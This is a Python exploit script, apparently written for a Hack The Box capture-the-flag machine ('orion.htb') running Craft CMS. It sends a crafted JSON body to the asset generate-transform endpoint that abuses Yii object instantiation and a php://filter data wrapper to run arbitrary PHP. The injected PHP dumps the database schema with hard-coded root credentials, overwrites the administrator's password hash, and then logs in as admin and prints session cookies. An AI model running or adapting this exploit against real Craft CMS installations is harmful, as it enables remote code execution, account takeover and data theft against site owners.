import requests, re, base64, time

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    filt = 'php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + b64
    s = requests.Session()
    s.get(f'{HOST}/index.php?p=admin/dashboard')
    r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
    m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
    tok = m.group(1) if m else ''
    body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":filt}]}}}
    return s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers={'Content-Type':'application/json','X-CSRF-Token':tok}, timeout=15)

# Step 1: Show tables and get schema info
php1 = '<?php ' \
    '$db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); ' \
    '$tables = $db->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN); ' \
    'file_put_contents("/dev/shm/tables.txt", implode("\\n", $tables)); ' \
    'foreach ($tables as $t) { ' \
    '  if (stripos($t, "user") !== false || stripos($t, "info") !== false || stripos($t, "system") !== false) { ' \
    '    $cols = $db->query("SHOW COLUMNS FROM `$t`")->fetchAll(PDO::FETCH_ASSOC); ' \
    '    file_put_contents("/dev/shm/table_$t.txt", json_encode($cols), FILE_APPEND); ' \
    '  } ' \
    '}'

print("[*] Step 1: Querying database schema ...")
r = inject_b64(php1)
print(f"    Status: {r.status_code}, Len: {len(r.text)}")
time.sleep(1)

# Step 2: Try to update password for all users with different column names
# Common Craft password columns: password, passwordHash, hashedPassword
for col in ['password', 'passwordHash', 'hashedPassword']:
    php2 = f'<?php ' \
        '$db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); ' \
        '$hash = "$2b$13$PgsgQCqNoAC7itF913P8CuoUiXHI0qF2nwxWbenb5kyJUlWE6/Sza"; ' \
        'try {{ ' \
        '  $s = $db->prepare("UPDATE users SET `{col}`=? WHERE id=1"); ' \
        '  $s->execute([$hash]); ' \
        '  $c = $s->rowCount(); ' \
        '  file_put_contents("/dev/shm/pwupd_{col}.txt", "OK rows=$c"); ' \
        '}} catch (Exception $e) {{ ' \
        '  file_put_contents("/dev/shm/pwupd_{col}.txt", "ERR:" . $e->getMessage()); ' \
        '}}'

    print(f"[*] Trying UPDATE users SET {col}=... WHERE id=1")
    r = inject_b64(php2)
    print(f"    Status: {r.status_code}")
    time.sleep(0.5)

# Step 3: Read the update results via a trick - write results to a PHP file and include it
# But we already know includes don't show output. Instead, let's write to a visible DB field.
# Let's update the 'info' or 'system' table to show the schema results
php3 = '<?php ' \
    '$tbls = @file_get_contents("/dev/shm/tables.txt"); ' \
    'file_put_contents("/dev/shm/status.txt", "tables_done=" . ($tbls !== false ? strlen($tbls) : 0)); ' \
    '// Check if pwupd files exist ' \
    'foreach (["password","passwordHash","hashedPassword"] as $col) { ' \
    '  $f = "/dev/shm/pwupd_$col.txt"; ' \
    '  $c = @file_get_contents($f); ' \
    '  file_put_contents("/dev/shm/status.txt", "\\n$col=" . ($c !== false ? trim($c) : "NOFILE"), FILE_APPEND); ' \
    '}'

print("[*] Step 3: Checking update results ...")
r = inject_b64(php3)
time.sleep(1)

# Step 4: Now try to login with the new password
print("[*] Step 4: Trying to login as admin ...")
s = requests.Session()
# First get login page
r = s.get(f'{HOST}/admin/login')
print(f"    Login page: Status {r.status_code}, Len {len(r.text)}")

# Try to login with common usernames
for username in ['admin', 'adam', 'administrator']:
    r = s.post(f'{HOST}/index.php?p=admin/actions/users/login', 
        data={'loginName': username, 'password': 'hack123', 'rememberMe': True},
        allow_redirects=False)
    print(f"    Login as '{username}': Status {r.status_code}, Location: {r.headers.get('Location', 'N/A')}")
    if r.status_code in [302, 301]:
        # Follow redirect to dashboard
        r2 = s.get(f'{HOST}{r.headers["Location"]}')
        print(f"    Dashboard: Status {r2.status_code}, Len {len(r2.text)}")
        if '/admin/dashboard' in r2.url or '/dashboard' in r2.url:
            print(f"[+] LOGGED IN as '{username}'!")
            # Try to access user settings
            r3 = s.get(f'{HOST}/index.php?p=admin/users')
            print(f"    Users page: Status {r3.status_code}, Len {len(r3.text)}")
            if 'users' in r3.text.lower():
                print(f"    Users page content (first 2000): {r3.text[:2000]}")
            break
        break

print(f"    Final URL: {r2.url if 'r2' in dir() else 'N/A'}")
print(f"    Cookies: {dict(s.cookies)}")
